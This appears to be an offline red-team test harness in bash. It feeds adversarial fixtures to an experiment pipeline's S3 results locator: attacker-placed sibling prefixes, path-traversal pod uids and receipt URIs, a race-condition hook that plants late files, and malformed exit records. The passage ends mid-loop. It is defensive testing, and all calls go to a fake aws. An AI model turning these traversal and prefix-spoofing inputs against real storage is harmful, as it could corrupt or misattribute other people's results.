#!/usr/bin/env bash
# Red-team adversarial fixtures for TASK-20261107-9d2b6a (EXP-ICPERF-127dbd, C1 results locator). Offline only.
#
# usage (from anywhere): env -i HOME="$HOME" TMPDIR=<tmp> PATH=<review>/evidence/isobin:/usr/bin:/bin bash rt_harness.sh OUTDIR
#
# It refuses to start unless `aws` resolves to the committed offline fake implementation/tests/fake-aws and no AWS_* variable
# is set. Every launch_eks.sh / reconcile_run.sh run goes through that fake (directly, or through fixtures/isobin-wrap/aws,
# which delegates every call to the same fake by path). No input file is edited: launch_eks.sh and locate_results.sh are
# copied for the wrapper runs (as tests/test_locator.sh does) and their copies are hash-checked; reconcile_run.sh runs in place.
# The job outputs are synthetic. The launcher receipt shape is tests/fixtures/receipt/{result,status}.json (a launcher receipt,
# not the pod-uid prefix). Nothing under any pod-uid prefix of a real job is read.
set -u
FXD=$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
REVIEW=$(cd "$FXD/.." && pwd)
EXP=$(cd "$REVIEW/../.." && pwd)
WT=$(cd "$EXP/../.." && pwd)
IMPL=$EXP/implementation
TESTS=$IMPL/tests
RCPT=$TESTS/fixtures/receipt
REQ1=$EXP/inputs/request-s1.json; REQ2=$EXP/inputs/request-s2.json; PROTO=$EXP/inputs/protocol.json; CHECKJOB=$IMPL/check_job.py
OUT=${1:?usage: rt_harness.sh OUTDIR}
mkdir -p "$OUT"; OUT=$(cd "$OUT" && pwd)
ISO_PATH=$PATH
WRAP_PATH="$FXD/isobin-wrap:/usr/bin:/bin"

SHA_LAUNCH=f93e8858923765c390fb7bcb01ea04c2373325815f08cbaf7df24b584e521da8
SHA_LOCATE=efcc29832806d604913c00afb6e92a2052cb784479cfc65dda42491655326c5e
SHA_RECON=eac18f21de151b55b543e7ebdf51aeda71a23061ae2f8f5449a5064af569bb93
BUCKET=isolab-results-104186811093-us-east-2
JOB1=ic-c1-dg-s1-20261106; JOB2=ic-c1-dg-s2-20261106
POD=5885ba61-53c2-4e2e-8a47-ff1ff04ee2e7          # the pod uid string as it appears in the launcher receipt fixture
LID=47cf1e4f-10a7-4ee3-862d-9e9700e122e3
JUID=8a20d036-efc2-45d2-ada6-6442b93c5a52
OTHER=0bbbbbbb-1111-2222-3333-555555555555         # an attacker-chosen pod uid
LID2=0ccccccc-1111-2222-3333-666666666666          # a second launcher receipt id
PIN_ECBENCH=73362eed4165d6db20fe1d398baa8fabefa2497aff6e78dab9ed8f31af31dd01
PIN_COMMIT=ea8e9ef71c3c82027dd9e01535302725519c3fca

# ---------------------------------------------------------------- isolation preconditions (RT-2)
fake_real=$(readlink -f "$TESTS/fake-aws")
[[ $(readlink -f "$(command -v aws)") == "$fake_real" ]] || { echo "REFUSED: aws is not the offline fake" >&2; exit 99; }
[[ $(env | grep -c '^AWS_') == 0 ]] || { echo "REFUSED: AWS_* variables present" >&2; exit 99; }
[[ ! -e /usr/bin/aws && ! -e /bin/aws ]] || { echo "REFUSED: an aws binary exists in /usr/bin or /bin" >&2; exit 99; }
[[ $(env PATH="$WRAP_PATH" bash -c 'command -v aws') == "$FXD/isobin-wrap/aws" ]] || { echo "REFUSED: wrapper PATH" >&2; exit 99; }
for pair in "$IMPL/launch_eks.sh:$SHA_LAUNCH" "$IMPL/locate_results.sh:$SHA_LOCATE" "$IMPL/reconcile_run.sh:$SHA_RECON"; do
  [[ $(sha256sum "${pair%%:*}" | cut -d ' ' -f1) == "${pair##*:}" ]] || { echo "REFUSED: input hash differs: ${pair%%:*}" >&2; exit 99; }
done

TABLE="$OUT/rt-results.tsv"
printf 'case\tquestion\tsound_result\tobserved\tverdict\n' > "$TABLE"
row() { printf '%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" "$5" | tee -a "$TABLE"; }

planned() { jq -r '(.job.spec.workloads.curves | length) * .job.spec.workloads.targets_per_curve
  * (.job.spec.measurement.warmup + .job.spec.measurement.rounds) * (.job.spec.arms | length)' "$1"; }

regen_sums() { (cd "$1" && find . -type f ! -name SHA256SUMS | sed 's|^\./||' | LC_ALL=C sort | xargs -d '\n' sha256sum) > "$1/SHA256SUMS"; }

# mk_jobset DIR JOB POD EXIT_JSON REQ : a synthetic job output set that check_job.py accepts against REQ
mk_jobset() {
  local d=$1 job=$2 pod=$3 ex=$4 req=$5
  mkdir -p "$d/session"
  printf '%s  ecbench\n' "$PIN_ECBENCH" > "$d/binary.sha256"
  jq -n --arg b "$PIN_ECBENCH" --arg c "$PIN_COMMIT" '{ecbench_sha256:$b, source_revision:$c}' > "$d/build-info.json"
  echo '{"accepted":true}' > "$d/l2-gate.json"
  jq '.job.spec' "$req" > "$d/input-spec.json"; cp "$d/input-spec.json" "$d/session/spec.json"
  yes '{}' 2>/dev/null | head -n "$(planned "$req")" > "$d/session/records.jsonl"
  echo '{"fixture":true}' > "$d/session/plan.json"
  echo fixture > "$d/audit.stderr"
  : > "$d/run-summary.json"
  printf '{"exit_code":%s,"job_name":"%s","pod_uid":"%s","node_name":"fixture"}\n' "$ex" "$job" "$pod" > "$d/job-exit.json"
  regen_sums "$d"
}
# objects_json PODDIR JOB POD > objects.json : launcher-style listing (Key, Size, ETag = md5 of the bytes) of a pod prefix
objects_json() {
  (cd "$1" && find . -type f | sed 's|^\./||' | LC_ALL=C sort | while read -r f; do
     printf '%s %s %s\n' "$(stat -c %s "$f")" "$(md5sum "$f" | cut -d ' ' -f1)" "$f"; done) \
  | jq -Rn --arg b "$BUCKET" --arg j "$2" --arg p "$3" '{next_token:null, results_uri:("s3://"+$b+"/runs/"+$j+"/"),
      objects:[inputs | split(" ") | {Key:("runs/"+$j+"/"+$p+"/"+.[2]), Size:(.[0]|tonumber), ETag:("\""+.[1]+"\"")}]}'
}
# mk_case_b ID JOB REQ [je_exit=42] [cexit=42] [launch_rc=26] [bstatus=FAILED] [status_mut=.] [result_mut=.]
#   T1 receipt shape (rule b): failed Job, empty results_uri, receipt at runs/JOB/launcher/LID/, one pod POD.
mk_case_b() {
  local id=$1 job=$2 req=$3; shift 3
  local -A P=(); local kv; for kv in "$@"; do P[${kv%%=*}]=${kv#*=}; done
  local fx="$OUT/cases/$id/fx"; rm -rf "$OUT/cases/$id"; mkdir -p "$fx/launcher"
  local pd="$fx/s3/runs/$job/$POD" rc="$fx/s3/runs/$job/launcher/$LID"; mkdir -p "$rc"
  mk_jobset "$pd" "${P[je_job]:-$job}" "${P[je_pod]:-$POD}" "${P[je_exit]:-42}" "$req"   # je_job/je_pod only change job-exit.json
  jq --arg j "$job" --arg u "$JUID" --arg r "s3://$BUCKET/runs/$job/launcher/$LID/" \
    '.job_name=$j | .job_uid=$u | .receipt_uri=$r' "$RCPT/result.json" | jq "${P[result_mut]:-.}" > "$rc/result.json"
  jq --arg j "$job" --arg u "$JUID" --arg p "$POD" --argjson cx "${P[cexit]:-42}" \
    '.job.job_name=$j | .job.uid=$u | .pods[0].uid=$p | .pods[0].status.containerStatuses[0].state.terminated.exitCode=$cx' \
    "$RCPT/status.json" | jq "${P[status_mut]:-.}" > "$rc/status.json"
  objects_json "$pd" "$job" "$POD" > "$rc/objects.json"
  cp "$rc/result.json" "$fx/launcher/result.json"
  echo "${P[launch_rc]:-26}" > "$fx/launch_rc"
  if [[ ${P[bstatus]-FAILED} == NONE ]]; then echo '{}' > "$fx/launcher/build.json"
  else jq -n --arg s "${P[bstatus]:-FAILED}" '{builds:[{buildStatus:$s}]}' > "$fx/launcher/build.json"; fi
}
# mk_case_a ID JOB REQ RESULTS_URI POD_UID [launch_rc=26] [bstatus=FAILED] [state=failed] : rule (a), non-empty results_uri
mk_case_a() {
  local id=$1 job=$2 req=$3 uri=$4 puid=$5 lrc=${6:-26} bs=${7:-FAILED} st=${8:-failed}
  local fx="$OUT/cases/$id/fx"; rm -rf "$OUT/cases/$id"; mkdir -p "$fx/launcher" "$fx/s3/runs/$job/launcher/$LID"
  jq --arg j "$job" --arg u "$JUID" --arg r "s3://$BUCKET/runs/$job/launcher/$LID/" --arg uri "$uri" --arg p "$puid" --arg st "$st" \
    '.job_name=$j | .job_uid=$u | .receipt_uri=$r | .results_uri=$uri | .pod_uid=$p | .state=$st' "$RCPT/result.json" > "$fx/launcher/result.json"
  cp "$fx/launcher/result.json" "$fx/s3/runs/$job/launcher/$LID/result.json"
  echo "$lrc" > "$fx/launch_rc"; jq -n --arg s "$bs" '{builds:[{buildStatus:$s}]}' > "$fx/launcher/build.json"
}

# run_wrapper ID REQ [PATH] : launch_eks.sh v3b (copies, hash-checked) against fake-aws + fake-launch-remote
run_wrapper() {
  local id=$1 req=$2 path=${3:-$ISO_PATH}; local fx="$OUT/cases/$id/fx" w="$OUT/cases/$id/wrap"
  rm -rf "$w"; mkdir -p "$w/impl" "$w/checkout/taskq/deploy/eks-karpenter/remote" "$w/rec" "$w/s3root" "$w/state"
  cp "$IMPL/launch_eks.sh" "$IMPL/locate_results.sh" "$w/impl/"; chmod +x "$w/impl/"*.sh
  [[ $(sha256sum "$w/impl/launch_eks.sh" | cut -d ' ' -f1) == "$SHA_LAUNCH" && $(sha256sum "$w/impl/locate_results.sh" | cut -d ' ' -f1) == "$SHA_LOCATE" ]] \
    || { echo "copy hash mismatch" >&2; exit 98; }
  local r="$w/checkout/taskq/deploy/eks-karpenter/remote" f
  cp "$TESTS/fake-launch-remote" "$r/launch-remote"
  printf '#!/usr/bin/env bash\ncat "$1"\n' > "$r/validate-request"
  echo '#!/usr/bin/env bash' > "$r/run-request"; echo 'version: 0.2' > "$r/current-run-request-buildspec.yml"
  chmod +x "$r/launch-remote" "$r/validate-request" "$r/run-request"
  : > "$w/impl/remote-pins.sha256"
  for f in launch-remote validate-request run-request current-run-request-buildspec.yml; do
    printf '%s  %s\n' "$(sha256sum "$r/$f" | cut -d ' ' -f1)" "$f" >> "$w/impl/remote-pins.sha256"; done
  printf '{"run_id":"RUN-RT","trial_id":"T2"}\n' > "$w/rec/launch.json"
  : > "$w/aws.log"
  env PATH="$path" FAKE_AWS_LOG="$w/aws.log" FAKE_S3_ROOT="$w/s3root" FAKE_CASE_DIR="$fx" RT_STATE="$w/state" AWS_REGION=us-east-2 \
    ISOLAB_BUCKET="$BUCKET" ISOLAB_CODEBUILD_PROJECT=isolab-experiment-launcher CRYPTO_CHECKOUT="$w/checkout" \
    bash "$w/impl/launch_eks.sh" --protocol "$PROTO" --experiment-id EXP-ICPERF-127dbd --hypothesis-id H-ICPERF-4cb536 \
    --task-id TASK-RT --approved-by DEC-RT --trial-id T2 --run-id RUN-RT --out "$w/rec/job" --record-dir "$w/rec" "$req" \
    > "$w/stdout" 2> "$w/stderr"
  W_RC=$?
  W_CLASS=$(jq -r '.outcome_class // "absent"' "$w/rec/raw-result.json" 2>/dev/null || echo absent)
  W_LOC=$(jq -r '.results_locator // "absent"' "$w/rec/raw-result.json" 2>/dev/null || echo absent)
  W_URI=$(jq -r '.results_uri // "absent"' "$w/rec/raw-result.json" 2>/dev/null || echo absent)
  W_DL=$(jq -r '.download_exit // "absent"' "$w/rec/raw-result.json" 2>/dev/null || echo absent)
  W_RAW=$([[ -f $w/rec/raw-result.json ]] && echo present || echo absent)
  W_WRITES=$(grep -c -E 'REFUSED|^aws s3 cp [^ ]+ s3://|^aws (s3 (rm|mv|sync)|s3api|codebuild (start|batch))' "$w/aws.log" "$w/stderr" 2>/dev/null | awk -F: '{s+=$2} END {print s+0}')
  W_DIR=$w
  # S03-trial-s2 validity (runbook.yaml lines 343-402 transcribed by the reviewer; argv-literal ids omitted)
  W_VALID=$(jq -r '
    [ .schema=="c1.launch.raw-result/v1", .attack_claimed==false, .submitted==true, .outcome_class=="job_completed",
      (.launch_remote_exit|IN(0,26)), (.codebuild_status|IN("SUCCEEDED","FAILED")), .retried==false,
      .job_exit_json_present=="yes", .sha256sums_present=="yes", (.job_exit_code|IN("0","42","43")),
      (.results_uri|test("^s3://isolab-results-104186811093-us-east-2/runs/ic-c1-dg-s[12]-20261106/[0-9a-f-]{36}/$")),
      (.results_locator|IN("launcher_result","receipt_status_pod_uid")),
      (.job_uid|test("^[0-9a-f-]{36}$")), (.pod_uid|test("^[0-9a-f-]{36}$")) ] | all' "$w/rec/raw-result.json" 2>/dev/null || echo false)
}
# check_job on the wrapper download
run_cj() { # run_cj ID REQ
  local w="$OUT/cases/$1/wrap"
  if [[ -d $w/rec/job/artifacts ]]; then
    python3 -I "$CHECKJOB" "$w/rec/job/artifacts" --request "$2" --launcher-result "$w/rec/job/launcher/result.json" > "$w/check_job.stdout" 2>&1
    CJ_RC=$?; CJ_LAST=$(tail -n 1 "$w/check_job.stdout")
  else CJ_RC=none; CJ_LAST=no-artifacts; fi
}
# run_reconcile ID [SHA] [PATH] [extra env assignments...] ; reconcile_run.sh runs in place
run_reconcile() {
  local id=$1 sha=${2:-} path=${3:-$ISO_PATH}; shift 3 2>/dev/null || shift $#
  local fx="$OUT/cases/$id/fx" w="$OUT/cases/$id/rec"
  [[ -n $sha ]] || sha=$(sha256sum "$fx/launcher/result.json" | cut -d ' ' -f1)
  rm -rf "$w"; mkdir -p "$w/s3root" "$w/state"; cp -r "$fx/s3/." "$w/s3root/"; : > "$w/aws.log"
  env PATH="$path" FAKE_AWS_LOG="$w/aws.log" FAKE_S3_ROOT="$w/s3root" RT_STATE="$w/state" ISOLAB_BUCKET="$BUCKET" "$@" \
    bash "$IMPL/reconcile_run.sh" --launcher-result "$fx/launcher/result.json" --launcher-result-sha256 "$sha" --request "$REQ1" \
    --check-job "$CHECKJOB" --run-id RUN-ICPERF-8b0d47 --trial-id T1 --out "$w/out" > "$w/stdout" 2> "$w/stderr"
  R_RC=$?; R_DIR=$w
  R_PASS=$(jq -r '.reconcile_pass | tostring' "$w/out/reconcile-result.json" 2>/dev/null || echo absent)
  R_WRITES=$(grep -c -E 'REFUSED|^aws s3 cp [^ ]+ s3://|^aws (s3 (rm|mv|sync)|s3api|codebuild)' "$w/aws.log" "$w/stderr" 2>/dev/null | awk -F: '{s+=$2} END {print s+0}')
}
# prune ID : keep logs and records, drop bulky synthetic trees, keep a sha256 listing of what was dropped
prune() {
  local c="$OUT/cases/$1"
  (cd "$c" && find . -type f \( -path '*/s3/*' -o -path '*/s3root/*' -o -path '*/artifacts/*' -o -path '*/checkout/*' -o -path '*/impl/*' \) \
     -print0 | LC_ALL=C sort -z | xargs -0 -r sha256sum) > "$c/pruned-files.sha256"
  rm -rf "$c"/fx/s3 "$c"/wrap/s3root "$c"/wrap/rec/job/artifacts "$c"/wrap/checkout "$c"/wrap/impl "$c"/rec/s3root "$c"/rec/out/artifacts
}
# objctl : the control reconcile_run.sh does not run. Downloaded (size, path) and md5 against the launcher's objects.json
#   (Size, Key, ETag); it needs no AWS call. Prints same | DIFFERS.
objctl() {
  local o="$R_DIR/out/locator/objects.json" a="$R_DIR/out/artifacts"
  local want have
  want=$(jq -r --arg p "runs/$JOB1/$POD/" '.objects[] | "\(.Size) \(.ETag|gsub("\"";"")) \(.Key|ltrimstr($p))"' "$o" | LC_ALL=C sort -k3)
  have=$(cd "$a" && find . -type f | sed 's|^\./||' | LC_ALL=C sort | while read -r f; do printf '%s %s %s\n' "$(stat -c %s "$f")" "$(md5sum "$f" | cut -d ' ' -f1)" "$f"; done | LC_ALL=C sort -k3)
  [[ $want == "$have" ]] && echo same || echo DIFFERS
}
W() { echo "rc=$W_RC class=$W_CLASS locator=$W_LOC raw=$W_RAW dl=$W_DL s03_validity=$W_VALID s3_write_attempts=$W_WRITES"; }

echo "== rt_harness $(date -u +%FT%TZ) worktree=$(git -C "$WT" rev-parse HEAD 2>/dev/null) jq=$(jq --version) bash=$BASH_VERSION" | tee "$OUT/rt-header.txt"
echo "aws=$(command -v aws) -> $(readlink -f "$(command -v aws)"); AWS_ vars=$(env | grep -c '^AWS_')" | tee -a "$OUT/rt-header.txt"

# ================================================================ (a) binding of the results prefix
mk_case_b A00-control-T1-shape "$JOB1" "$REQ1"
run_wrapper A00-control-T1-shape "$REQ1"; run_cj A00-control-T1-shape "$REQ1"
run_reconcile A00-control-T1-shape "" "$ISO_PATH"
row A00-control-T1-shape a "job_completed rc0; reconcile pass" "$(W); check_job=$CJ_LAST; reconcile rc=$R_RC pass=$R_PASS writes=$R_WRITES; control(object-list vs objects.json)=$(objctl)" control
prune A00-control-T1-shape

# A01 rule (a) branch: result.json names an attacker-placed sibling prefix runs/JOB/OTHER/ (the real pod prefix also exists)
id=A01-ruleA-sibling-prefix
mk_case_a $id "$JOB2" "$REQ2" "s3://$BUCKET/runs/$JOB2/$OTHER/" "$OTHER"
mk_jobset "$OUT/cases/$id/fx/s3/runs/$JOB2/$POD" "$JOB2" "$POD" 42 "$REQ2"          # the genuine pod's output
mk_jobset "$OUT/cases/$id/fx/s3/runs/$JOB2/$OTHER" "$JOB2" "$OTHER" 42 "$REQ2"      # attacker-placed, self-consistent
run_wrapper $id "$REQ2"; run_cj $id "$REQ2"
row $id a,b "not job_completed (two pod prefixes; not this pod)" "$(W) uri=$W_URI; check_job=$CJ_LAST" "$([[ $W_CLASS == job_completed ]] && echo BREAK || echo holds)"
prune $id

# A02 rule (a) branch: the S2 job's result.json names the S1 job's pod prefix
id=A02-ruleA-cross-job
mk_case_a $id "$JOB2" "$REQ2" "s3://$BUCKET/runs/$JOB1/$POD/" "$POD"
mk_jobset "$OUT/cases/$id/fx/s3/runs/$JOB1/$POD" "$JOB1" "$POD" 42 "$REQ1"
run_wrapper $id "$REQ2"; run_cj $id "$REQ2"
row $id a,b "not job_completed (another job's prefix)" "$(W) uri=$W_URI; check_job=$CJ_LAST" "$([[ $W_CLASS == job_completed ]] && echo BREAK-wrapper || echo holds)"
prune $id

# A03 rule (a) branch: another bucket
id=A03-ruleA-other-bucket
mk_case_a $id "$JOB2" "$REQ2" "s3://rt-9d2b6a-elsewhere/x/$OTHER/" "$OTHER"
mk_jobset "$OUT/cases/$id/fx/s3/x/$OTHER" "$JOB2" "$OTHER" 42 "$REQ2"
run_wrapper $id "$REQ2"; run_cj $id "$REQ2"
row $id a,b "not job_completed (outside s3://BUCKET/runs/JOB/)" "$(W) uri=$W_URI; check_job=$CJ_LAST" "$([[ $W_CLASS == job_completed ]] && echo BREAK-wrapper || echo holds)"
prune $id

# A04 the pinned launcher's own rule-(a)-with-exit-26 shape: state verification_failed, results_uri = the exit-0 pod
id=A04-ruleA-verification-failed-genuine
mk_case_a $id "$JOB2" "$REQ2" "s3://$BUCKET/runs/$JOB2/$POD/" "$POD" 26 FAILED verification_failed
mk_jobset "$OUT/cases/$id/fx/s3/runs/$JOB2/$POD" "$JOB2" "$POD" 0 "$REQ2"
run_wrapper $id "$REQ2"; run_cj $id "$REQ2"
row $id a,b "not job_completed (launcher rejected the output)" "$(W); check_job=$CJ_LAST" "$([[ $W_CLASS == job_completed ]] && echo BREAK || echo holds)"
prune $id

# A05 a pod prefix that extends the located uid (same 36-char uid + suffix) also exists
id=A05-uid-prefix-sibling
mk_case_b $id "$JOB1" "$REQ1"; mkdir -p "$OUT/cases/$id/fx/s3/runs/$JOB1/${POD}0"; echo x > "$OUT/cases/$id/fx/s3/runs/$JOB1/${POD}0/job-exit.json"
run_wrapper $id "$REQ1"; run_reconcile $id "" "$ISO_PATH"
row $id a "refused (listing holds a third entry)" "$(W); reconcile rc=$R_RC pass=$R_PASS" "$([[ $W_CLASS != job_completed && $R_PASS != true ]] && echo holds || echo BREAK)"
prune $id

# A06 receipt_uri variants (rule b)
for v in "A06a-receipt-other-job|s3://$BUCKET/runs/$JOB2/launcher/$LID/" "A06b-receipt-dotdot|s3://$BUCKET/runs/$JOB1/launcher/$LID/../" \
         "A06c-receipt-other-bucket|s3://rt-9d2b6a-elsewhere/runs/$JOB1/launcher/$LID/" "A06d-receipt-deeper|s3://$BUCKET/runs/$JOB1/launcher/$LID/x/"; do
  id=${v%%|*}; ru=${v#*|}
  mk_case_b $id "$JOB1" "$REQ1" "result_mut=.receipt_uri=\"$ru\""
  run_wrapper $id "$REQ1"
  row $id a "refused, locator exit 12" "$(W) locate=$(grep -o 'locate_results exit [0-9]*' "$W_DIR/stdout" | head -1)" "$([[ $W_CLASS != job_completed ]] && echo holds || echo BREAK)"
  prune $id
done
# A06e a second launcher receipt id under runs/JOB/launcher/ named by result.json (not the build that ran), self-consistent
id=A06e-receipt-second-launcher-id
mk_case_b $id "$JOB1" "$REQ1" "result_mut=.receipt_uri=\"s3://$BUCKET/runs/$JOB1/launcher/$LID2/\""
mv "$OUT/cases/$id/fx/s3/runs/$JOB1/launcher/$LID" "$OUT/cases/$id/fx/s3/runs/$JOB1/launcher/$LID2"
run_wrapper $id "$REQ1"
row $id a "note: located through a receipt id that is not result.json .launcher / build id" "$(W); result.launcher=$(jq -r .launcher "$OUT/cases/$id/fx/launcher/result.json" | sed 's/.*://')" "$([[ $W_LOC == receipt_status_pod_uid ]] && echo NOTE-accepted || echo refused)"
prune $id
# A06f a receipt id of 36 dashes passes the [a-f0-9-]{36} shape
id=A06f-receipt-id-all-dashes
D36=------------------------------------
mk_case_b $id "$JOB1" "$REQ1" "result_mut=.receipt_uri=\"s3://$BUCKET/runs/$JOB1/launcher/$D36/\""
mv "$OUT/cases/$id/fx/s3/runs/$JOB1/launcher/$LID" "$OUT/cases/$id/fx/s3/runs/$JOB1/launcher/$D36"
run_wrapper $id "$REQ1"
row $id a "note: shape check is not a UUID check" "$(W)" "$([[ $W_LOC == receipt_status_pod_uid ]] && echo NOTE-accepted || echo refused)"
prune $id

# A07 pod uid with path characters / odd shapes in status.json
for v in "A07a-poduid-dotdot|../../$JOB2/x" "A07b-poduid-slash|$POD/../x" "A07c-poduid-35|${POD:0:35}" "A07d-poduid-upper|${POD^^}"; do
  id=${v%%|*}; pu=${v#*|}
  mk_case_b $id "$JOB1" "$REQ1" "status_mut=.pods[0].uid=\"$pu\""
  run_wrapper $id "$REQ1"
  row $id a "refused, locator exit 15" "$(W) locate=$(grep -o 'locate_results exit [0-9]*' "$W_DIR/stdout" | head -1)" "$([[ $W_CLASS != job_completed ]] && echo holds || echo BREAK)"
  prune $id
done
id=A07e-poduid-trailing-newline
mk_case_b $id "$JOB1" "$REQ1" "status_mut=.pods[0].uid=\"$POD\\n\""
run_wrapper $id "$REQ1"
row $id a "note: command substitution strips the newline" "$(W) pod=$(jq -r .pod_uid "$W_DIR/rec/raw-result.json" 2>/dev/null)" "$([[ $W_CLASS == job_completed ]] && echo NOTE-accepted || echo refused)"
prune $id

# A12 status.json identity mismatches
for v in 'A12a-status-job-uid|.job.uid="00000000-0000-0000-0000-000000000000"' 'A12b-status-job-name|.job.job_name="ic-c1-dg-s2-20261106"' \
         'A12c-two-pods|.pods+=[(.pods[0]|.uid="0bbbbbbb-1111-2222-3333-555555555555")]' 'A12d-zero-pods|.pods=[]'; do
  id=${v%%|*}; mk_case_b $id "$JOB1" "$REQ1" "status_mut=${v#*|}"
  run_wrapper $id "$REQ1"; run_reconcile $id "" "$ISO_PATH"
  row $id a "refused (14/15)" "$(W) locate=$(grep -o 'locate_results exit [0-9]*' "$W_DIR/stdout" | head -1); reconcile rc=$R_RC pass=$R_PASS" "$([[ $W_CLASS != job_completed && $R_PASS != true ]] && echo holds || echo BREAK)"
  prune $id
done

# A08 restarted container (restartCount 2, lastState terminated 1): the locator does not look
id=A08-restart-count
mk_case_b $id "$JOB1" "$REQ1" 'status_mut=.pods[0].status.containerStatuses[0].restartCount=2 | .pods[0].status.containerStatuses[0].lastState={terminated:{exitCode:1,reason:"Error"}}'
run_wrapper $id "$REQ1"; run_reconcile $id "" "$ISO_PATH"
row $id a "refuse or flag a restarted container" "$(W); reconcile rc=$R_RC pass=$R_PASS" "$([[ $W_CLASS == job_completed || $R_PASS == true ]] && echo NOTE-accepted || echo refused)"
prune $id

# A09 content under the correct prefix changed after the launcher's objects.json snapshot, SHA256SUMS regenerated
for v in A09a-added-object A09b-replaced-object; do
  id=$v; mk_case_b $id "$JOB1" "$REQ1"; pd="$OUT/cases/$id/fx/s3/runs/$JOB1/$POD"
  if [[ $v == A09a-added-object ]]; then echo '{"placed":"after the launcher snapshot"}' > "$pd/session/extra.json"
  else echo "replaced after the launcher snapshot" > "$pd/audit.stderr"; fi
  regen_sums "$pd"
  run_reconcile $id "" "$ISO_PATH"
  # the control the reconciliation does not run: downloaded (size, path) and md5 versus objects.json (Size, Key, ETag); zero AWS calls
  ctl=$(objctl)
  row $id a "refuse: bytes differ from the launcher's objects.json" "reconcile rc=$R_RC pass=$R_PASS; control(object-list vs objects.json)=$ctl" "$([[ $R_PASS == true ]] && echo BREAK || echo holds)"
  prune $id
done
# A09c objects.json without an .objects array is a vacuous R-3 pass; A09d a truncated listing (next_token set) also passes
id=A09c-objects-json-vacuous; mk_case_b $id "$JOB1" "$REQ1"; echo '{}' > "$OUT/cases/$id/fx/s3/runs/$JOB1/launcher/$LID/objects.json"
run_reconcile $id "" "$ISO_PATH"
row $id a "R-3 objects.json half should fail on a document with no objects" "reconcile rc=$R_RC pass=$R_PASS r3=$(jq -r .r3_outcome "$R_DIR/out/reconcile-result.json")" "$([[ $R_PASS == true ]] && echo NOTE-vacuous || echo holds)"
prune $id
id=A09d-objects-json-truncated; mk_case_b $id "$JOB1" "$REQ1"
f="$OUT/cases/$id/fx/s3/runs/$JOB1/launcher/$LID/objects.json"; jq '.next_token="tok" | .objects=.objects[0:2]' "$f" > "$f.t" && mv "$f.t" "$f"
run_reconcile $id "" "$ISO_PATH"
row $id a "R-3 should not accept a truncated launcher listing" "reconcile rc=$R_RC pass=$R_PASS" "$([[ $R_PASS == true ]] && echo NOTE-truncated-accepted || echo holds)"
prune $id

# A09e objects.json lists a key outside launcher/ and the pod prefix: R-3 must refuse (exit 5)
id=A09e-objects-json-key-outside; mk_case_b $id "$JOB1" "$REQ1"
f="$OUT/cases/$id/fx/s3/runs/$JOB1/launcher/$LID/objects.json"; jq --arg k "runs/$JOB1/$OTHER/job-exit.json" '.objects += [{Key:$k, Size:1}]' "$f" > "$f.t" && mv "$f.t" "$f"
run_reconcile $id "" "$ISO_PATH"
row $id a "R-3 refuses (exit 5)" "reconcile rc=$R_RC pass=$R_PASS r3=$(jq -r .r3_outcome "$R_DIR/out/reconcile-result.json")" "$([[ $R_RC == 5 && $R_PASS == false ]] && echo holds || echo BREAK)"
prune $id

# A10 TOCTOU: right after the locator's listing a third party adds a late pod prefix AND a listed file under the located prefix
id=A10-toctou-after-listing; mk_case_b $id "$JOB1" "$REQ1"
cat > "$OUT/cases/$id/toctou-hook.sh" <<HOOK
set -e
mkdir -p "\$FAKE_S3_ROOT/runs/$JOB1/$OTHER"; echo late > "\$FAKE_S3_ROOT/runs/$JOB1/$OTHER/job-exit.json"
pd="\$FAKE_S3_ROOT/runs/$JOB1/$POD"; echo '{"placed":"between listing and download"}' > "\$pd/session/late.json"
(cd "\$pd" && find . -type f ! -name SHA256SUMS | sed 's|^\./||' | LC_ALL=C sort | xargs -d '\n' sha256sum) > "\$pd/SHA256SUMS"
HOOK
export RT_MODE=toctou RT_TOCTOU_AT=2 RT_TOCTOU_HOOK="$OUT/cases/$id/toctou-hook.sh"
run_wrapper $id "$REQ1" "$WRAP_PATH"; run_cj $id "$REQ1"
late_dl=$([[ -f $W_DIR/rec/job/artifacts/session/late.json ]] && echo downloaded || echo absent)
other_dl=$(find "$W_DIR/rec/job/artifacts" -path "*$OTHER*" 2>/dev/null | wc -l)
export RT_TOCTOU_AT=1
run_reconcile $id "" "$WRAP_PATH"
unset RT_MODE RT_TOCTOU_AT RT_TOCTOU_HOOK
row $id a "late prefix not bound; late bytes are not this job's output" "$(W); check_job=$CJ_LAST; late.json=$late_dl; other-prefix files downloaded=$other_dl; reconcile rc=$R_RC pass=$R_PASS" \
  "$([[ $other_dl == 0 ]] && echo 'holds(prefix)' || echo BREAK)/$([[ $late_dl == downloaded && $W_CLASS == job_completed ]] && echo 'content-not-bound' || echo ok)"
prune $id

# ================================================================ (b) job_completed / exit 0 without this pod's accepted job-exit.json
for v in "B01-jobexit-missing|rm" "B02-jobexit-empty|empty" "B03-jobexit-not-json|notjson" "B04-jobexit-is-directory|dir" \
         'B05-exit-string-42|"42"' "B06-exit-true|true" "B07-exit-false|false" "B08-exit-null|null" "B09-exit-42.5|42.5" "B10-exit-42.0|42.0" "B11-exit-array|[42]"; do
  id=${v%%|*}; m=${v#*|}
  case $m in rm|empty|notjson|dir) mk_case_b $id "$JOB1" "$REQ1" ;; *) mk_case_b $id "$JOB1" "$REQ1" "je_exit=$m" ;; esac
  pd="$OUT/cases/$id/fx/s3/runs/$JOB1/$POD"
  case $m in
    rm) rm -f "$pd/job-exit.json"; regen_sums "$pd" ;;
    empty) : > "$pd/job-exit.json"; regen_sums "$pd" ;;
    notjson) printf 'exit 42\n' > "$pd/job-exit.json"; regen_sums "$pd" ;;
    dir) rm -f "$pd/job-exit.json"; mkdir -p "$pd/job-exit.json"; echo '{"exit_code":42}' > "$pd/job-exit.json/part"; regen_sums "$pd" ;;
  esac
  run_wrapper $id "$REQ1"
  row $id b "not job_completed, not rc0; raw-result.json written; rc not 2/3/4 after a submission" "$(W)" \
    "$([[ $W_CLASS == job_completed || $W_RC == 0 ]] && echo BREAK || { [[ $W_RAW == absent || $W_RC == 2 || $W_RC == 3 || $W_RC == 4 ]] && echo NOTE-crash || echo holds; })"
  prune $id
done
# B16 rule (b): job-exit.json of another pod / job / exit
for v in "B16a-jobexit-other-pod|je_pod=$OTHER" "B16b-jobexit-other-job|je_job=$JOB2" "B16c-jobexit-ne-container|cexit=43"; do
  id=${v%%|*}; mk_case_b $id "$JOB1" "$REQ1" "${v#*|}"
  run_wrapper $id "$REQ1"; run_reconcile $id "" "$ISO_PATH"
